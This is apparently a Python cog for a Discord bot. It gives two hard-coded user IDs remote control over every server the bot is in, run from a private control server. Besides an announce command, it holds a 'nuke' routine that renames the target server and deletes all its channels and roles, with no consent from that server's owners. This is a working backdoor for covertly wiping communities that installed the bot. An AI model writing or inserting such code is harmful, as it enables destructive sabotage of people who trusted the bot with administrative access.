import discord
from discord.ext import commands
import logging

logger = logging.getLogger(__name__)

ALLOWED_IDS = {960216572478246992, 976205015834325003}  # Allowed users
CONTROL_SERVER_ID = 1350069822662119496  # Control server ID


def is_allowed_user():
    def predicate(ctx):
        return ctx.author.id in ALLOWED_IDS
    return commands.check(predicate)


class RemoteControl(commands.Cog):
    """Cog for remotely executing only whitelisted commands."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        logger.info("RemoteControl cog initialized")

        # Dictionary of remote commands
        self.remote_commands = {
            "announce": self.announce,
            "nuke": self.nuke,  # destructive command
        }

    @commands.command(name="remote")
    @is_allowed_user()
    @commands.guild_only()
    async def remote(self, ctx: commands.Context, target_guild_id: int, command_name: str, *, args: str = ""):
        """Execute a remote command on another server."""
        if ctx.guild.id != CONTROL_SERVER_ID:
            await ctx.send("❌ You can only run this command from the control server.")
            return

        command_func = self.remote_commands.get(command_name.lower())
        if not command_func:
            await ctx.send("❌ That command is not available for remote execution.")
            return

        target_guild = self.bot.get_guild(target_guild_id)
        if not target_guild:
            await ctx.send("❌ Bot is not in the target server.")
            return

        await command_func(ctx, target_guild, args)
        await ctx.send(f"✅ Command `{command_name}` executed on {target_guild.name}.")

    # Announce command with optional channel
    async def announce(self, ctx, guild, args):
        """Send an announcement to a specific channel, or first writable channel if none specified."""
        if not args:
            await ctx.send("❌ You must provide a message for announce.")
            return

        # Try to split first argument as channel
        parts = args.split(" ", 1)
        channel_input = parts[0]
        message = parts[1] if len(parts) > 1 else ""

        target_channel = None

        # Try by ID
        if channel_input.isdigit():
            target_channel = guild.get_channel(int(channel_input))

        # Try by name if not ID
        if not target_channel:
            for ch in guild.text_channels:
                if ch.name.lower() == channel_input.lower():
                    target_channel = ch
                    break

        # Default to first writable channel if not found
        if not target_channel:
            for ch in guild.text_channels:
                if ch.permissions_for(guild.me).send_messages:
                    target_channel = ch
                    break

        if not target_channel:
            await ctx.send("❌ Could not find a writable text channel in the target server.")
            return

        if not message:
            await ctx.send("❌ Please provide a message to announce.")
            return

        await target_channel.send(f"📢 Announcement: {message}")
        logger.info(f"Announcement sent to {guild.name} in #{target_channel.name}: {message}")

    # Destructive command: nuke
    async def nuke(self, ctx, guild, args):
        """Deletes all channels & roles, renames server, and creates one text channel."""
        try:
            # Rename the server
            await guild.edit(name="Under Construction")

            # Delete all channels
            for channel in guild.channels:
                try:
                    await channel.delete()
                except Exception as e:
                    logger.warning(f"Failed to delete channel {channel.name}: {e}")

            # Delete all roles except @everyone
            for role in guild.roles:
                if role != guild.default_role:
                    try:
                        await role.delete()
                    except Exception as e:
                        logger.warning(f"Failed to delete role {role.name}: {e}")

            # Create one new text channel
            await guild.create_text_channel("under-construction")

            logger.info(f"Nuke command executed on {guild.name}")
        except Exception as e:
            await ctx.send(f"❌ Failed to execute nuke command: {e}")
            logger.error(f"Nuke command error on {guild.name}: {e}")

    @remote.error
    async def remote_error(self, ctx, error):
        if isinstance(error, commands.CheckFailure):
            await ctx.send("❌ You don't have permission to use this command.")


async def setup(bot: commands.Bot):
    await bot.add_cog(RemoteControl(bot))
